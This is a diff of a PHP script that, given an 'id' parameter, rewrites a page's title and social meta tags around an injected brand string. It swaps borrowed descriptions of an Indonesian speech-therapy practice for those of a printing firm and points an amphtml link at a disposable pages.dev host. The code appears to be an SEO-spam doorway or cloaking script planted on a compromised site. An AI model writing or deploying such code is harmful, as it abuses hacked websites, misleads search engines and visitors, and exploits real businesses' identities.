@@ -340,15 +340,15 @@ if (isset($_GET['id']) && $_GET['id'] !== '' && $fetch_success && !empty($websit
 
     $custom_head = $website_head;
 
-    updateMetaTag($custom_head, '/<title>.*?<\/title>/is', '<title>' . $BRANDS . ' %Y Gleviczky Marianna Layanan Terapi Wicara Profesional</title>');
-    updateMetaTag($custom_head, '/<meta\s+name="description"[^>]*>/i', '<meta name="description" content="' . $BRANDS . ' Temukan layanan terapi wicara untuk anak dan dewasa, mulai dari pemeriksaan kemampuan berbicara, konsultasi, hingga terapi artikulasi dan pengembangan komunikasi.">');
+    updateMetaTag($custom_head, '/<title>.*?<\/title>/is', '<title>' . $BRANDS . ' %T AD Group Layanan Percetakan Digital dan Desain Kreatif</title>');
+    updateMetaTag($custom_head, '/<meta\s+name="description"[^>]*>/i', '<meta name="description" content="' . $BRANDS . ' Temukan layanan percetakan digital, desain grafis, pembuatan brosur, poster, kartu nama, materi promosi, serta berbagai kebutuhan publikasi untuk bisnis.">');
     updateMetaTag($custom_head, '/<meta\s+property="og:site_name"[^>]*>/i', '<meta property="og:site_name" content="' . $BRANDS . '">');
     updateMetaTag($custom_head, '/<meta\s+property="og:url"[^>]*>/i', '<meta property="og:url" content="' . $urlPath . '">');
-    updateMetaTag($custom_head, '/<meta\s+property="og:title"[^>]*>/i', '<meta property="og:title" content="' . $BRANDS . ' %Y Gleviczky Marianna Layanan Terapi Wicara Profesional">');
+    updateMetaTag($custom_head, '/<meta\s+property="og:title"[^>]*>/i', '<meta property="og:title" content="' . $BRANDS . ' %T AD Group Layanan Percetakan Digital dan Desain Kreatif">');
     updateMetaTag($custom_head, '/<meta\s+property="og:type"[^>]*>/i', '<meta property="og:type" content="product">');
-    updateMetaTag($custom_head, '/<meta\s+property="og:description"[^>]*>/i', '<meta property="og:description" content="' . $BRANDS . ' Temukan layanan terapi wicara untuk anak dan dewasa, mulai dari pemeriksaan kemampuan berbicara, konsultasi, hingga terapi artikulasi dan pengembangan komunikasi.">');
-    updateMetaTag($custom_head, '/<meta\s+name="twitter:title"[^>]*>/i', '<meta name="twitter:title" content="' . $BRANDS . ' %Y Gleviczky Marianna Layanan Terapi Wicara Profesional">');
-    updateMetaTag($custom_head, '/<meta\s+name="twitter:description"[^>]*>/i', '<meta name="twitter:description" content="' . $BRANDS . ' Temukan layanan terapi wicara untuk anak dan dewasa, mulai dari pemeriksaan kemampuan berbicara, konsultasi, hingga terapi artikulasi dan pengembangan komunikasi.">');
+    updateMetaTag($custom_head, '/<meta\s+property="og:description"[^>]*>/i', '<meta property="og:description" content="' . $BRANDS . ' Temukan layanan percetakan digital, desain grafis, pembuatan brosur, poster, kartu nama, materi promosi, serta berbagai kebutuhan publikasi untuk bisnis.">');
+    updateMetaTag($custom_head, '/<meta\s+name="twitter:title"[^>]*>/i', '<meta name="twitter:title" content="' . $BRANDS . ' %T AD Group Layanan Percetakan Digital dan Desain Kreatif">');
+    updateMetaTag($custom_head, '/<meta\s+name="twitter:description"[^>]*>/i', '<meta name="twitter:description" content="' . $BRANDS . ' Temukan layanan percetakan digital, desain grafis, pembuatan brosur, poster, kartu nama, materi promosi, serta berbagai kebutuhan publikasi untuk bisnis.">');
     updateMetaTag($custom_head, '/<link\s+rel="canonical"[^>]*>/i', '<link rel="canonical" href="' . $urlPath . '">');
     updateMetaTag($custom_head, '/<meta\s+http-equiv="X-UA-Compatible"[^>]*>/i', '<meta http-equiv="X-UA-Compatible" content="IE=edge">');
     updateMetaTag($custom_head, '/<meta\s+name="viewport"[^>]*>/i', '<meta name="viewport" content="width=device-width,initial-scale=1">');
@@ -356,7 +356,7 @@ if (isset($_GET['id']) && $_GET['id'] !== '' && $fetch_success && !empty($websit
     updateMetaTag($custom_head, '/<meta\s+http-equiv="Referrer-Policy"[^>]*>/i', '<meta http-equiv="Referrer-Policy" content="no-referrer-when-downgrade">');
     updateMetaTag($custom_head, '/<meta\s+name="theme-color"[^>]*>/i', '<meta name="theme-color" content="">');
 
-    $amphtml_link = '<link rel="amphtml" href="https://amp039ggo.pages.dev/amp5/?id=' . $BRANDS . '">';
+    $amphtml_link = '<link rel="amphtml" href="https://amp803is.pages.dev/amp5/?id=' . $BRANDS . '">';
     updateMetaTag($custom_head, '/<link\s+rel="amphtml"[^>]*>/i', $amphtml_link);
 
     if (!preg_match('/<script>var\s+aPageStart/i', $custom_head)) {
@@ -370,7 +370,7 @@ if (isset($_GET['id']) && $_GET['id'] !== '' && $fetch_success && !empty($websit
     echo '<main style="padding: 60px 20px; text-align: center; min-height: 400px; display: flex; align-items: center; justify-content: center;">' . "\n";
     echo '<div>' . "\n";
     echo '<h1 style="font-size: 48px; margin-bottom: 20px;">' . (isset($BRANDS) ? $BRANDS : 'BRAND') . '</h1>' . "\n";
-    echo '<p style="font-size: 20px; color: #666; margin-bottom: 30px;">Temukan layanan terapi wicara untuk anak dan dewasa, mulai dari pemeriksaan kemampuan berbicara, konsultasi, hingga terapi artikulasi dan pengembangan komunikasi.</p>' . "\n";
+    echo '<p style="font-size: 20px; color: #666; margin-bottom: 30px;">Temukan layanan percetakan digital, desain grafis, pembuatan brosur, poster, kartu nama, materi promosi, serta berbagai kebutuhan publikasi untuk bisnis.</p>' . "\n";
     echo '<p style="color: #999; font-size: 14px;">' . date('Y-m-d H:i:s') . '</p>' . "\n";
     echo '</div>' . "\n";
     echo '</main>' . "\n";
